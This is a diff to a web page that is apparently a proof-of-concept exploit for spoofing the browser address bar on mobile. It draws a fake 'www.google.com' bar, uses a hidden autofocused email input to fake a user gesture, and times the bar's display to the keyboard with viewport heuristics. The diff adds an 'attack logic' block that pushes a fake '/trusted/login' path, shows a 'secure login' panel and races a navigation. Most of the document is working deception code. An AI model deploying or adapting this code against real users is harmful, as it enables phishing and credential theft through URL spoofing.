@@ -20,9 +20,7 @@ body {
   padding: 24px;
 }
 
-h1 {
-  font-weight: 400;
-}
+h1 { font-weight: 400; }
 
 .fake-bar {
   position: fixed;
@@ -35,15 +33,10 @@ h1 {
   font-size: 14px;
   color: #eaeaea;
   z-index: 9999;
-
   bottom: 0;
   opacity: 0;
   visibility: hidden;
-
-  transition:
-    opacity .25s ease,
-    visibility .25s ease,
-    bottom .2s ease;
+  transition: opacity .25s ease, visibility .25s ease, bottom .2s ease;
 }
 
 .fake-bar.show {
@@ -51,18 +44,27 @@ h1 {
   visibility: visible;
 }
 
-.debug {
-  margin-top: 24px;
-  font-size: 13px;
-  color: #9aa0a6;
-  line-height: 1.6;
-}
-
-/* hidden input */
 #x {
   position: fixed;
   opacity: 0;
   pointer-events: none;
+}
+
+/* attack panel */
+#panel {
+  display: none;
+  margin-top: 24px;
+  padding: 16px;
+  border: 1px solid #303134;
+  background: #121212;
+}
+
+button {
+  padding: 10px 16px;
+  background: #1a73e8;
+  border: none;
+  color: #fff;
+  font-size: 14px;
 }
 </style>
 </head>
@@ -72,20 +74,21 @@ h1 {
 <h1>address spoof when find in pages search</h1>
 <p>this is not rill <b>google</b></p>
 
-<div class="debug" id="debug"></div>
+<button id="start">Continue</button>
 
-<!-- hidden input for user-gesture heuristic -->
+<div id="panel">
+  <p>Loading secure login…</p>
+</div>
+
 <input id="x" autocomplete="email" autofocus>
 
-<div class="fake-bar" id="fakeBar">
-  www.google.com
-</div>
+<div class="fake-bar" id="fakeBar">www.google.com</div>
 
 <script>
 const fakeBar = document.getElementById("fakeBar");
-const debug = document.getElementById("debug");
 const themeColor = document.getElementById("themeColor");
 const input = document.getElementById("x");
+const panel = document.getElementById("panel");
 
 let lastViewportHeight = window.innerHeight;
 let lastScrollY = window.scrollY;
@@ -93,7 +96,6 @@ let lastInputTime = 0;
 let active = false;
 
 /* ================= HELPERS ================= */
-
 function setTheme(color) {
   themeColor.setAttribute("content", color);
 }
@@ -114,30 +116,22 @@ function hideBar() {
 }
 
 /* ================= USER GESTURE TRICK ================= */
+setTimeout(() => input.focus(), 100);
 
-/* delayed focus */
-setTimeout(() => {
-  input.focus();
-}, 100);
-
-/* click listener */
 document.addEventListener("click", () => {
   input.focus();
   input.click();
 });
 
-/* typing tracker */
 document.addEventListener("input", () => {
   lastInputTime = Date.now();
 });
 
-/* scroll tracker */
 window.addEventListener("scroll", () => {
   lastScrollY = window.scrollY;
 });
 
-/* ================= CORE HEURISTIC ================= */
-
+/* ================= VIEWPORT HEURISTIC ================= */
 if (window.visualViewport) {
   window.visualViewport.addEventListener("resize", () => {
     const vv = window.visualViewport;
@@ -155,12 +149,7 @@ if (window.visualViewport) {
     const recentlyTyped = now - lastInputTime < 800;
     const scrollMoved = Math.abs(window.scrollY - lastScrollY) > 40;
 
-    if (
-      keyboardLike &&
-      !hasFocusedInput &&
-      !recentlyTyped &&
-      !scrollMoved
-    ) {
+    if (keyboardLike && !hasFocusedInput && !recentlyTyped && !scrollMoved) {
       const bottomOffset = window.innerHeight - vv.height;
       showBar(bottomOffset);
     } else {
@@ -171,7 +160,24 @@ if (window.visualViewport) {
   });
 }
 
-/* orientation reset */
+/* ================= ATTACK LOGIC ================= */
+/* Step 1: Fake trusted path */
+document.getElementById('start').onclick = () => {
+  history.pushState({}, '', '/trusted/login');
+  panel.style.display = 'block';
+};
+
+/* Step 2: Navigation race (TARGET DI AKHIR) */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090/#https://google.com:9090';
+      }, 80);
+    });
+  });
+});
+
 window.addEventListener("orientationchange", hideBar);
 </script>
 
